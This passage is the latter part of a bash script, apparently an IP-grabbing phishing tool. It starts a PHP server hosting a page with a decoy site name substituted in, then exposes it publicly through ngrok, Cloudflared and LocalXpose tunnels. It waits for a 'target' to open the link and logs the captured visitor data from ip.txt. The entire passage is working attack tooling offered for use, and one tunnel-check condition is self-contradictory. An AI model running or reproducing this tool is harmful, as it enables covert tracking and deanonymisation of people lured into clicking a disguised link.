    sed s+"website"+"$default_site"+g ip.php > index.php
    cp -r ip.php index.php
fi
php -S "${local_url}" > /dev/null 2>&1 &
sleep 2
status=$(curl -s --head -w %{http_code} ${local_url} -o /dev/null)
if echo "$status" | grep -q "200" || echo "$status" | grep -q "302" ;then
    echo -e "${success}PHP has started successfully!\n"
else
    echo -e "${error}PHP couldn't start!\n\007"
    killer; exit 1
fi
sleep 1
echo -e "${info}Starting tunnelers......\n"
netcheck
find "$tunneler_dir" -name "*.log" -delete
netcheck
args=""
if [ "$REGION" != false ]; then
    args="--region $REGION"
fi
if [ "$SUBDOMAIN" != false ]; then
    if [ "$args" == "" ]; then
        args="--subdomain $SUBDOMAIN"
    else
        args="$args --subdomain $SUBDOMAIN"
    fi
fi
$ngrok_command http $args "${local_url}" > /dev/null 2>&1 &
$cf_command tunnel -url "${local_url}" &> "$tunneler_dir/cf.log" &
$loclx_command tunnel --raw-mode http --https-redirect $args -t "${local_url}" &> "$tunneler_dir/loclx.log" &
sleep 10
cd "$HOME/.site"
ngroklink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z.]*.ngrok.io")
if ! [ -z "$ngroklink" ]; then
    ngrokcheck=true
else
    ngrokcheck=false
fi
for second in {1..10}; do
    if [ -f "$tunneler_dir/cf.log" ]; then
        cflink=$(grep -Eo "https://[-0-9a-z.]{4,}.trycloudflare.com" "$tunneler_dir/cf.log")
        sleep 1
    fi
    if ! [ -z "$cflink" ]; then
        cfcheck=true
        break
    else
        cfcheck=false
    fi
done
for second in {1..10}; do
    if [ -f "$tunneler_dir/loclx.log" ]; then
        loclxlink=$(grep -o "[-0-9a-z.]*.loclx.io" "$tunneler_dir/loclx.log")
        sleep 1
    fi
    if ! [ -z "$loclxlink" ]; then
        loclxcheck=true
        loclxlink="https://${loclxlink}"
        break
    else
        loclxcheck=false
    fi
done
if ( $ngrokcheck && $cfcheck && $loclxcheck ); then
    echo -e "${success}Ngrok, Cloudflared and Loclx have started successfully!\n"
    url_manager "$cflink" 1 2
    url_manager "$ngroklink" 3 4
    url_manager "$loclxlink" 5 6
elif ( $ngrokcheck && $cfcheck &&  ! $loclxcheck ); then
    echo -e "${success}Ngrok and Cloudflared have started successfully!\n"
    url_manager "$cflink" 1 2
    url_manager "$ngroklink" 3 4
elif ( $ngrokcheck && $loclxcheck &&  ! $cfcheck ); then
    echo -e "${success}Ngrok and Loclx have started successfully!\n"
    url_manager "$ngroklink" 1 2
    url_manager "$loclxlink" 3 4
elif ( $cfcheck && $loclxcheck &&  ! $loclxcheck ); then
    echo -e "${success}Cloudflared and Loclx have started successfully!\n"
    url_manager "$cflink" 1 2
    url_manager "$loclxlink" 3 4
elif ( $ngrokcheck && ! $cfcheck &&  ! $loclxcheck ); then
    echo -e "${success}Ngrok has started successfully!\n"
    url_manager "$ngroklink" 1 2
elif ( $cfcheck &&  ! $ngrokcheck &&  ! $loclxcheck ); then
    echo -e "${success}Cloudflared has started successfully!\n"
    url_manager "$cflink" 1 2
elif ( $loclxcheck && ! $ngrokcheck &&  ! $cfcheck ); then
    echo -e "${success}Loclx has started successfully!\n"
    url_manager "$loclxlink" 1 2
elif ! ( $ngrokcheck && $cfcheck && $loclxcheck ) ; then
    echo -e "${error}Tunneling failed! Start your own port forwarding/tunneling service at port ${PORT}\n";
fi
sleep 1
rm -rf ip.txt
echo -e "${info}Waiting for target. ${cyan}Press ${red}Ctrl + C ${cyan}to exit...\n"
while true; do
    if [[ -e "ip.txt" ]]; then
        echo -e "\007\n${success}Target opened the link!\n"
        while IFS= read -r line; do
            echo -e "${green}[${blue}*${green}]${yellow} $line"
        done < ip.txt
        cat ip.txt >> "$cwd/ip.txt"
        echo -e "\n${info}Saved in ip.txt"
        rm -rf ip.txt
        echo -e "\n${info}Waiting for next. ${cyan}Press ${red}Ctrl + C ${cyan}to exit...\n"
    fi
    sleep 0.5
done 
